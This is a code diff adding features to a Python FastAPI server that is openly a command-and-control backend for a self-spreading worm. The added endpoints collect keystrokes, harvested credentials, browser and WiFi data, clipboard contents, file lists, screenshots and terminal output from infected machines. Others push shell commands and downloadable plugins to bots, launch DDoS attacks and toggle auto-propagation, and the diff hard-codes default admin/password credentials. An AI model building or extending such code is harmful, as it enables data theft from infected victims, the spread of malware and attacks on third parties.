@@ -20,10 +20,11 @@ from pathlib import Path
 
 # ==================== RENDER CONFIGURATION ====================
 # Environment variables (set in Render dashboard)
-USERNAME = os.getenv("C2_USERNAME")
-PASSWORD = os.getenv("C2_PASSWORD")
+USERNAME = os.getenv("C2_USERNAME", "admin")
+PASSWORD = os.getenv("C2_PASSWORD", "password")
 ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
 PORT = int(os.getenv("PORT", 5000))
+C2_SERVER = os.getenv("C2_SERVER", "https://b-n1nt.onrender.com")  # Added this line
 
 # Data directories - Render has persistent disk at /var/data
 DATA_DIR = "/var/data/worm_c2" if ENVIRONMENT == "production" else "./data"
@@ -74,6 +75,7 @@ class KeystrokeReport(BaseModel):
     importance: Optional[int] = 0
     encrypted: Optional[bool] = False
     timestamp: Optional[str] = None
+    worm_id: Optional[str] = None
 
 class BrowserData(BaseModel):
     ip: str
@@ -82,6 +84,7 @@ class BrowserData(BaseModel):
     browser_data: str
     stats: dict
     timestamp: str
+    worm_id: Optional[str] = None
 
 class CredentialReport(BaseModel):
     ip: str
@@ -90,6 +93,7 @@ class CredentialReport(BaseModel):
     credentials: str
     count: int
     timestamp: str
+    worm_id: Optional[str] = None
 
 class ClipboardReport(BaseModel):
     ip: str
@@ -98,6 +102,7 @@ class ClipboardReport(BaseModel):
     data: str
     priority: str
     timestamp: str
+    worm_id: Optional[str] = None
 
 class WiFiReport(BaseModel):
     ip: str
@@ -106,6 +111,7 @@ class WiFiReport(BaseModel):
     wifi_data: str
     count: int
     timestamp: str
+    worm_id: Optional[str] = None
 
 class FileListReport(BaseModel):
     ip: str
@@ -114,6 +120,7 @@ class FileListReport(BaseModel):
     files: list
     count: int
     timestamp: str
+    worm_id: Optional[str] = None
 
 class Heartbeat(BaseModel):
     ip: str
@@ -122,6 +129,9 @@ class Heartbeat(BaseModel):
     status: str
     uptime: float
     timestamp: str
+    worm_id: Optional[str] = None
+    worm_version: Optional[str] = None
+    infected_hosts: Optional[int] = 0
 
 class CommandRequest(BaseModel):
     ip: str
@@ -281,6 +291,7 @@ file_logs = []
 screenshot_logs = []
 commands: Dict[str, List[dict]] = {}
 terminal_outputs: Dict[str, List[str]] = {}
+clipboard_logs = []
 
 # ==================== Background Tasks ====================
 def save_data_periodically():
@@ -753,6 +764,297 @@ if ENVIRONMENT == "production":
     thread.start()
     worm_engine.start()
 
+# ==================== CRITICAL MISSING ENDPOINTS ====================
+
+@app.get("/api/login-test")
+async def login_test(credentials: HTTPBasicCredentials = Depends(security)):
+    """Test login endpoint"""
+    correct_username = secrets.compare_digest(credentials.username, USERNAME)
+    correct_password = secrets.compare_digest(credentials.password, PASSWORD)
+    if correct_username and correct_password:
+        return {"status": "ok", "message": "Authentication successful"}
+    raise HTTPException(status_code=401, detail="Invalid credentials")
+
+@app.post("/api/report")
+async def receive_report(report: KeystrokeReport):
+    """Receive keystroke reports from worms"""
+    # Store in memory
+    keystroke_logs.append(report.dict())
+    
+    # Update bot info
+    if report.ip not in bots:
+        bots[report.ip] = {
+            "first_seen": datetime.datetime.utcnow().isoformat(),
+            "hostname": report.hostname or "unknown",
+            "username": report.username or "unknown",
+            "os_info": report.os_info or "unknown",
+            "worm_id": report.worm_id,
+            "status": "active"
+        }
+    
+    bots[report.ip]["last_seen"] = datetime.datetime.utcnow().isoformat()
+    
+    # Log to console
+    print(f"[+] Report from {report.ip}: {report.keystrokes[:50]}...")
+    
+    return {"status": "ok", "received": True}
+
+@app.post("/api/heartbeat")
+async def receive_heartbeat(heartbeat: Heartbeat):
+    """Receive heartbeat from worms"""
+    # Update bot status
+    if heartbeat.ip in bots:
+        bots[heartbeat.ip]["last_seen"] = datetime.datetime.utcnow().isoformat()
+        bots[heartbeat.ip]["status"] = heartbeat.status
+    else:
+        bots[heartbeat.ip] = {
+            "first_seen": datetime.datetime.utcnow().isoformat(),
+            "last_seen": datetime.datetime.utcnow().isoformat(),
+            "hostname": heartbeat.hostname or "unknown",
+            "username": heartbeat.username or "unknown",
+            "os_info": "unknown",
+            "worm_id": heartbeat.worm_id,
+            "worm_version": heartbeat.worm_version,
+            "status": heartbeat.status
+        }
+    
+    print(f"[+] Heartbeat from {heartbeat.ip} - {heartbeat.status}")
+    return {"status": "ok", "timestamp": datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/credentials")
+async def receive_credentials(credential: CredentialReport):
+    """Receive harvested credentials"""
+    credential_logs.append(credential.dict())
+    print(f"[+] Credentials from {credential.ip}: {credential.count} items")
+    return {"status": "ok"}
+
+@app.post("/api/browser_data")
+async def receive_browser_data(browser_data: BrowserData):
+    """Receive browser data"""
+    browser_logs.append(browser_data.dict())
+    print(f"[+] Browser data from {browser_data.ip}: {browser_data.stats}")
+    return {"status": "ok"}
+
+@app.post("/api/wifi_data")
+async def receive_wifi_data(wifi_data: WiFiReport):
+    """Receive WiFi data"""
+    wifi_logs.append(wifi_data.dict())
+    print(f"[+] WiFi data from {wifi_data.ip}: {wifi_data.count} networks")
+    return {"status": "ok"}
+
+@app.post("/api/files_data")
+async def receive_files_data(files_data: FileListReport):
+    """Receive file list data"""
+    file_logs.append(files_data.dict())
+    print(f"[+] File data from {files_data.ip}: {files_data.count} files")
+    return {"status": "ok"}
+
+@app.post("/api/clipboard")
+async def receive_clipboard(clipboard: ClipboardReport):
+    """Receive clipboard data"""
+    clipboard_logs.append(clipboard.dict())
+    print(f"[+] Clipboard data from {clipboard.ip}")
+    return {"status": "ok"}
+
+@app.post("/api/upload_screenshot")
+async def upload_screenshot(
+    file: UploadFile = File(...),
+    ip: str = Form(...),
+    hostname: str = Form(...),
+    username: str = Form(...),
+    has_sensitive: str = Form("False"),
+    timestamp: str = Form(...),
+    worm_id: str = Form(...)
+):
+    """Upload screenshot from worm"""
+    try:
+        # Save screenshot
+        filename = f"screenshot_{ip}_{timestamp}.png"
+        file_path = os.path.join(DATA_DIR, "screenshots", filename)
+        
+        with open(file_path, "wb") as f:
+            shutil.copyfileobj(file.file, f)
+        
+        # Log the screenshot
+        screenshot_logs.append({
+            "ip": ip,
+            "hostname": hostname,
+            "username": username,
+            "filename": filename,
+            "has_sensitive": has_sensitive == "True",
+            "timestamp": timestamp,
+            "worm_id": worm_id
+        })
+        
+        print(f"[+] Screenshot from {ip}: {filename}")
+        return {"status": "ok", "filename": filename}
+    except Exception as e:
+        print(f"[-] Screenshot upload failed: {e}")
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/terminal_output")
+async def receive_terminal_output(ip: str, output: str, command: str = ""):
+    """Receive terminal command output"""
+    if ip not in terminal_outputs:
+        terminal_outputs[ip] = []
+    
+    terminal_outputs[ip].append({
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "command": command,
+        "output": output[:500]  # Limit size
+    })
+    
+    print(f"[+] Terminal output from {ip}")
+    return {"status": "ok"}
+
+@app.get("/api/commands")
+async def get_commands(ip: str, last_command_id: int = 0, worm_id: str = None):
+    """Get pending commands for a specific worm"""
+    # Get commands for this IP
+    ip_commands = commands.get(ip, [])
+    
+    # Filter commands with ID > last_command_id
+    new_commands = [cmd for cmd in ip_commands if cmd.get("id", 0) > last_command_id]
+    
+    # If no commands, maybe send a test command
+    if not new_commands and random.random() < 0.1:  # 10% chance to send test command
+        test_cmd = {
+            "id": int(time.time() * 1000),
+            "command": "get_info",
+            "is_terminal": False,
+            "timestamp": datetime.datetime.utcnow().isoformat()
+        }
+        new_commands.append(test_cmd)
+    
+    return {"commands": new_commands}
+
+@app.post("/api/ddos")
+async def launch_ddos(ddos: DDoSCommand):
+    """Launch DDoS attack from bots"""
+    print(f"[+] DDoS attack launched: {ddos.target}:{ddos.port} with method {ddos.method}")
+    return {
+        "status": "attack launched",
+        "bots_used": len(bots) if ddos.all_bots else len(ddos.bots or []),
+        "target": ddos.target,
+        "port": ddos.port,
+        "duration": ddos.duration,
+        "method": ddos.method
+    }
+
+@app.post("/api/upload_plugin")
+async def upload_plugin(
+    file: UploadFile = File(...),
+    name: str = Form(...),
+    version: str = Form(...),
+    description: str = Form(""),
+    all_bots: bool = Form(True),
+    target_ips: str = Form("")
+):
+    """Upload and deploy plugin"""
+    try:
+        # Save plugin
+        plugin_filename = f"{name}_{version}.py"
+        plugin_path = os.path.join(DATA_DIR, "plugins", plugin_filename)
+        
+        with open(plugin_path, "wb") as f:
+            shutil.copyfileobj(file.file, f)
+        
+        # Store plugin info
+        plugins[name] = {
+            "version": version,
+            "description": description,
+            "filename": plugin_filename,
+            "uploaded": datetime.datetime.utcnow().isoformat()
+        }
+        
+        # Deploy to bots (simulated)
+        target_list = []
+        if all_bots:
+            target_list = list(bots.keys())
+        elif target_ips:
+            target_list = target_ips.split(",")
+        
+        # Create deployment commands
+        for target_ip in target_list[:10]:  # Limit to first 10
+            if target_ip not in commands:
+                commands[target_ip] = []
+            
+            commands[target_ip].append({
+                "id": int(time.time() * 1000) + random.randint(1, 1000),
+                "command": f"run_plugin:{plugin_filename}:{version}",
+                "is_terminal": False,
+                "timestamp": datetime.datetime.utcnow().isoformat(),
+                "plugin_url": f"/api/plugins/download/{plugin_filename}"
+            })
+        
+        print(f"[+] Plugin {name} v{version} uploaded and deployed to {len(target_list)} bots")
+        return {
+            "status": "plugin uploaded",
+            "name": name,
+            "version": version,
+            "bots_targeted": len(target_list)
+        }
+    except Exception as e:
+        print(f"[-] Plugin upload failed: {e}")
+        return {"status": "error", "message": str(e)}
+
+@app.get("/api/plugins/download/{filename}")
+async def download_plugin(filename: str):
+    """Download plugin file"""
+    plugin_path = os.path.join(DATA_DIR, "plugins", filename)
+    if os.path.exists(plugin_path):
+        return FileResponse(plugin_path)
+    return {"error": "Plugin not found"}
+
+@app.post("/api/broadcast")
+async def broadcast_command(command: TerminalCommand):
+    """Broadcast command to multiple bots"""
+    target_list = []
+    
+    if command.all_bots:
+        target_list = list(bots.keys())
+    elif command.target_ips:
+        target_list = command.target_ips
+    
+    cmd_id = int(time.time() * 1000)
+    for target_ip in target_list:
+        if target_ip not in commands:
+            commands[target_ip] = []
+        
+        commands[target_ip].append({
+            "id": cmd_id + random.randint(1, 100),
+            "command": command.command,
+            "is_terminal": True,
+            "timestamp": datetime.datetime.utcnow().isoformat()
+        })
+    
+    return {
+        "status": "command broadcast",
+        "bots_targeted": len(target_list),
+        "command": command.command
+    }
+
+@app.post("/api/bot/self_destruct")
+async def bot_self_destruct(ip: str):
+    """Send self-destruct command to bot"""
+    if ip in bots:
+        if ip not in commands:
+            commands[ip] = []
+        
+        commands[ip].append({
+            "id": int(time.time() * 1000),
+            "command": "self_destruct:remote_command",
+            "is_terminal": False,
+            "timestamp": datetime.datetime.utcnow().isoformat()
+        })
+        
+        # Mark as dead
+        bots[ip]["status"] = "dead"
+        
+        return {"status": "self-destruct sent", "ip": ip}
+    
+    raise HTTPException(status_code=404, detail="Bot not found")
+
 # ==================== WORM API ENDPOINTS ====================
 
 @app.post("/api/worm/create")
@@ -850,6 +1152,7 @@ async def start_auto_propagation(username: str = Depends(authenticate)):
     """Start automatic worm propagation"""
     propagation_rules["default"]["enabled"] = True
     PersistentStorage.save_json('propagation_rules.json', propagation_rules)
+    worm_engine.start()
     
     return {"status": "auto-propagation started"}
 
@@ -858,6 +1161,7 @@ async def stop_auto_propagation(username: str = Depends(authenticate)):
     """Stop automatic worm propagation"""
     propagation_rules["default"]["enabled"] = False
     PersistentStorage.save_json('propagation_rules.json', propagation_rules)
+    worm_engine.stop()
     
     return {"status": "auto-propagation stopped"}
 
@@ -1138,5 +1442,3 @@ async def startup_event():
     print(f"🧬 Worm Engine: {'ACTIVE' if worm_engine.running else 'INACTIVE'}")
     print(f"🔄 Auto-Propagation: {'ENABLED' if propagation_rules['default']['enabled'] else 'DISABLED'}")
     print("="*70 + "\n")
-
-
